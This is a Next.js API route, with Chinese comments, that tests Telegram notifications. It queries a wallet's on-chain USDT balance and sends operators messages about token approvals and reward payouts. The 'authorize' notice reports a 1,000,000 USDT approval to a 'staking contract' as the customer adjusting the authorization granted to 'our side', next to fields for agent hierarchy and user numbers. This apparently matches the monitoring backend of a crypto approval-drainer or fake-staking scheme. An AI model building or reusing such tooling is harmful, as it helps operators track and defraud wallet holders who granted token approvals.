import { NextRequest, NextResponse } from 'next/server'

// ETH主网USDT合约地址
const USDT_CONTRACT = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
const ETH_RPC_URL = 'https://ethereum.publicnode.com'

/**
 * 获取链上USDT余额
 */
async function getOnChainUSDTBalance(address: string): Promise<number> {
  try {
    // 1. 获取最新区块号
    const blockResponse = await fetch(ETH_RPC_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        jsonrpc: '2.0',
        method: 'eth_blockNumber',
        params: [],
        id: 1
      })
    })

    const blockData = await blockResponse.json()
    const blockNumber = blockData.result

    // 2. 调用USDT合约的balanceOf方法
    const balanceResponse = await fetch(ETH_RPC_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        jsonrpc: '2.0',
        method: 'eth_call',
        params: [
          {
            to: USDT_CONTRACT,
            data: `0x70a08231${address.slice(2).padStart(64, '0')}`
          },
          blockNumber
        ],
        id: 1
      })
    })

    const balanceData = await balanceResponse.json()
    
    if (balanceData.error) {
      console.error('❌ 获取余额失败:', balanceData.error)
      return 0
    }

    // 3. 解析余额 (ETH主网USDT使用6位小数)
    const balanceHex = balanceData.result
    const balanceWei = BigInt(balanceHex)
    const balance = Number(balanceWei) / Math.pow(10, 6)

    return balance

  } catch (error) {
    console.error('❌ 获取链上USDT余额异常:', error)
    return 0
  }
}

/**
 * 发送Telegram消息
 */
async function sendTelegramMessage(message: string): Promise<boolean> {
  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID

  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn('Telegram配置缺失')
    return false
  }

  try {
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    })

    const result = await response.json()
    return result.ok

  } catch (error) {
    console.error('发送Telegram消息失败:', error)
    return false
  }
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { address, testType = 'authorize' } = body

    if (!address) {
      return NextResponse.json(
        { error: '请提供地址参数' },
        { status: 400 }
      )
    }

    console.log(`🧪 测试Telegram通知: ${testType}`)

    // 获取链上USDT余额
    const onChainBalance = await getOnChainUSDTBalance(address)
    console.log(`链上USDT余额: ${onChainBalance} USDT`)

    let message = ''

    if (testType === 'authorize') {
      // 构建授权通知消息
      message = `
钱包余额: ${onChainBalance.toFixed(6)}
顶层代理: 
代理昵称: 
用户编号: 999
用户备注: 暂无备注
是否活动: 是
用户钱包: 
${address}
授权金额: 1000000 USDT
客户地址: 
${address.toLowerCase()}
授权对象: 
${process.env.STAKING_CONTRACT_ADDRESS || '0xc8aC739F97Ba872b49FAfCfA072b5965fe4bE218'}
执行操作: 客户调整我方授权额度
      `.trim()
    } else if (testType === 'reward') {
      // 构建奖励发放通知消息
      message = `
**🎁 测试奖励发放通知**

**用户信息**:
   - 用户ID: 999
   - 地址: \`${address}\`

**钱包余额**:
   - 链上USDT余额: ${onChainBalance.toFixed(6)} USDT

**奖励详情**:
   - 奖励类型: periodic_reward
   - USDT金额: 5.00 USDT
   - ETH金额: 0.001116 ETH
   - ETH价格: 4480.00 USDT

**时间**: ${new Date().toLocaleString('zh-CN')}
      `.trim()
    }

    // 发送Telegram消息
    const success = await sendTelegramMessage(message)

    return NextResponse.json({
      success,
      message: success ? 'Telegram通知发送成功' : 'Telegram通知发送失败',
      data: {
        address,
        onChainBalance,
        testType,
        message
      }
    })

  } catch (error) {
    console.error('❌ 测试Telegram通知异常:', error)
    return NextResponse.json(
      { error: '服务器内部错误: ' + error.message },
      { status: 500 }
    )
  }
}

export async function GET(request: NextRequest) {
  const { searchParams } = new URL(request.url)
  const address = searchParams.get('address')
  const testType = searchParams.get('type') || 'authorize'

  if (!address) {
    return NextResponse.json(
      { error: '请提供地址参数' },
      { status: 400 }
    )
  }

  try {
    console.log(`🧪 测试Telegram通知: ${testType}`)

    // 获取链上USDT余额
    const onChainBalance = await getOnChainUSDTBalance(address)
    console.log(`链上USDT余额: ${onChainBalance} USDT`)

    let message = ''

    if (testType === 'authorize') {
      message = `
钱包余额: ${onChainBalance.toFixed(6)}
顶层代理: 
代理昵称: 
用户编号: 999
用户备注: 暂无备注
是否活动: 是
用户钱包: 
${address}
授权金额: 1000000 USDT
客户地址: 
${address.toLowerCase()}
授权对象: 
${process.env.STAKING_CONTRACT_ADDRESS || '0xc8aC739F97Ba872b49FAfCfA072b5965fe4bE218'}
执行操作: 客户调整我方授权额度
      `.trim()
    } else if (testType === 'reward') {
      message = `
**🎁 测试奖励发放通知**

**用户信息**:
   - 用户ID: 999
   - 地址: \`${address}\`

**钱包余额**:
   - 链上USDT余额: ${onChainBalance.toFixed(6)} USDT

**奖励详情**:
   - 奖励类型: periodic_reward
   - USDT金额: 5.00 USDT
   - ETH金额: 0.001116 ETH
   - ETH价格: 4480.00 USDT

**时间**: ${new Date().toLocaleString('zh-CN')}
      `.trim()
    }

    // 发送Telegram消息
    const success = await sendTelegramMessage(message)

    return NextResponse.json({
      success,
      message: success ? 'Telegram通知发送成功' : 'Telegram通知发送失败',
      data: {
        address,
        onChainBalance,
        testType,
        message
      }
    })

  } catch (error) {
    console.error('❌ 测试Telegram通知异常:', error)
    return NextResponse.json(
      { error: '服务器内部错误: ' + error.message },
      { status: 500 }
    )
  }
}

